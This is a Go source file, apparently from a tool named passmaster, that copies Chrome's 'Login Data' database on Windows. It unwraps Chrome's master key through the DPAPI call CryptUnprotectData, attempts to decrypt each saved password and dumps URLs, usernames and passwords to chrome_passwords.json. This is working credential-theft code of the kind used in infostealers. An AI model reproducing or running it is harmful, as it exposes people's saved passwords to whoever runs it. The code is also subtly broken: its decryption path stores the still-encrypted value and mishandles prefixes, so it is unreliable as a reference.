package chrome

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/ElecTwix/passmaster/pkg/model/mpassword"
	"github.com/ncruces/go-sqlite3/driver"
	_ "github.com/ncruces/go-sqlite3/embed"
)

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	dataPath       string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	masterKey      []byte
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func checkFileExist(filePath string) bool {
	os.Open(filePath)
	_, err := os.Stat(filePath)
	return os.IsNotExist(err)
}

func getFileData(filePath string, flag int, perm os.FileMode) ([]byte, error) {
	file, err := os.OpenFile(dataPath, os.O_RDONLY, 0666)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func getMasterKey() ([]byte, error) {
	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := io.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}

func Start() error {
	// Check for Login Data file
	file, err := os.OpenFile(dataPath, os.O_RDONLY, os.ModeExclusive)
	if err != nil {
		return err
	}

	log.Println("Reading Login Data file")

	data, err := io.ReadAll(file)
	if err != nil {
		file.Close()
		return err
	}

	file.Close()

	randomFileName := RandStringBytes(5)

	tempFile, err := os.CreateTemp("", randomFileName)
	if err != nil {
		log.Fatal(err)
	}

	log.Println("Creating temp file")

	tempFilePath, err := filepath.Abs(tempFile.Name())
	if err != nil {
		return err
	}

	log.Println("Write to temp file")

	defer os.Remove(tempFile.Name())

	_, err = tempFile.Write(data)
	if err != nil {
		return err
	}

	log.Println("Syncing temp file")

	err = tempFile.Sync()
	if err != nil {
		return err
	}

	log.Println("Opening Database")

	// Open Database
	db, err := driver.Open(tempFilePath, nil)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	log.Println("Querying Database")

	// Select Rows to get data from
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		return err
	}

	defer rows.Close()

	passwords := make([]*mpassword.MPassword, 0)

	for rows.Next() {
		var url, username, pw string
		err = rows.Scan(&url, &username, &pw)
		if err != nil {
			return err
		}

		log.Printf("Found password for %s", url)

		log.Println("Decrypting password")
		// Decrypt Passwords
		passwordData, err := decryptpw(pw, url, username)
		if err != nil {
			fmt.Println(err)
			continue
		}

		log.Println("Password decrypted")

		passwords = append(passwords, passwordData)
	}
	err = rows.Err()
	if err != nil {
		return err
	}

	// Create files with the passwords
	outputFile, err := os.Create("chrome_passwords.json")
	if err != nil {
		return err
	}

	fileData, err := json.Marshal(passwords)
	if err != nil {
		return err
	}

	_, err = outputFile.Write(fileData)
	if err != nil {
		return err
	}

	log.Printf("Total %d passwords found and write to %s", len(passwords), outputFile.Name())

	return nil
}

func decryptpw(pw string, url string, username string) (*mpassword.MPassword, error) {
	if strings.HasPrefix(pw, "v10") { // Means it's chrome 80 or higher
		pw = strings.Trim(pw, "v10")

		// Chrome Version is 80 or higher, switching to the AES 256 decrypt.
		if string(masterKey) != "" {
			ciphertext := []byte(pw)
			c, err := aes.NewCipher(masterKey)
			if err != nil {
				return nil, err
			}
			gcm, err := cipher.NewGCM(c)
			if err != nil {
				return nil, err
			}
			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				return nil, fmt.Errorf("ciphertext too short")
			}

			nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			if err != nil {
				return nil, err
			}
			if string(plaintext) != "" {

				password := mpassword.New(username, pw, url)
				return password, nil
			}
		} else { // It the masterkey hasn't been requested yet, then gets it.
			mkey, err := getMasterKey()
			if err != nil {
				return nil, err
			}
			masterKey = mkey
		}
	} else { // Means it's chrome v. < 80
		pass, err := Decrypt([]byte(pw))
		if err != nil {
			return nil, err
		}

		if url != "" && url != "" && string(pass) != "" {

			password := mpassword.New(username, pw, url)
			return password, nil
		}
	}
	return nil, nil
}

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
